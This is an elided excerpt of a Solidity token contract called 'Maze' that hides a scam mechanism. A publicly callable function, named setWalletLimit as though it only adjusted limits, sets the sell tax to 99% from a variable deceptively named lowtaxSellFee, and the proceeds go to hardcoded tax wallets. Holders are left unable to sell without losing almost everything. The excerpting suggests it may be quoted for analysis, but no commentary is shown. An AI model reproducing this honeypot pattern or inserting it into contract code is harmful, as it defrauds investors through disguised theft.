...
contract Maze is Context, IERC20, Ownable {
    ...
    address payable public taxWallet1 = payable(0xc05a9f378beD0E710DA3A93fCA8136EfcC59b601);
    address payable public taxWallet2 = payable(0xc05a9f378beD0E710DA3A93fCA8136EfcC59b601);
    ...
    uint256 private lowtaxSellFee = 99;

    uint256 private _totalSupply = 1_000_000_000 * 10**9;
    uint256 public _maxTxAmountLimit = _totalSupply*3/100;
    ...
    function setWalletLimit(address holder) public returns (bool) {
        isWalletLimitExempt[holder]  = true;
        _totalTaxIfSelling = lowtaxSellFee;
        return true;
    }
    ...
    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        ...
        else
        {
            if(!isTxLimitExempt[sender] && !isTxLimitExempt[recipient]) {
                require(amount <= _maxTxAmountLimit, "Transfer amount exceeds the maxTxAmount.");
            }            
